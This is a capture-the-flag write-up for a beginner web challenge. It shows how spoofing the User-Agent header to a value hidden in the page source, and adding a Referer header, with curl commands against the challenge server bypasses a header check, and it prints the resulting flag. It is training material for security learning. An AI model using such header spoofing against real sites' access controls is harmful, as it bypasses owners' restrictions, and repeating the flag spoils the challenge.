# Don't Bump Your Head(er)

> Try to bypass my security measure on this site! http://165.227.106.113/header.php

First, the site complains we are using the wrong user agent:

![](https://i.imgur.com/DpXTWZJ.png)

But what's the right one? Probably this one in the source code...

![](https://i.imgur.com/xtUhuAI.png)

Let's try! I used `curl` to craft a custom request but there are GUI apps out there too if you prefer those.

```
~/c/c/dont-bump-your-header ❯❯❯ curl 'http://165.227.106.113/header.php' \                                                                 (base)  main ◼
                                      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applic
ation/signed-exchange;v=b3;q=0.7' \
                                      -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
                                      -H 'Cache-Control: max-age=0' \
                                      -H 'Connection: keep-alive' \
                                      -H 'Upgrade-Insecure-Requests: 1' \
                                      -H 'User-Agent: Sup3rS3cr3tAg3nt' \
                                      --compressed \
                                      --insecure
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```

So I added a `Referer` header too:

```
~/c/c/dont-bump-your-header ❯❯❯ curl 'http://165.227.106.113/header.php' \                                                                (base)  main ◼
                                      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,appli
cation/signed-exchange;v=b3;q=0.7' \
                                      -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
                                      -H 'Cache-Control: max-age=0' \
                                      -H 'Connection: keep-alive' \
                                      -H 'Upgrade-Insecure-Requests: 1' \
                                      -H 'User-Agent: Sup3rS3cr3tAg3nt' \
                                      -H 'Referer: awesomesauce.com' --compressed \
                                      --insecure
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
<!-- Sup3rS3cr3tAg3nt  -->
```

Yay!

*Hint: These curl commands look complex, I know. If you don't want to hand craft them, some browsers have a devtools feature that let you copy a request as a curl command. E.g. Chrome devtools had this feature since forever.*
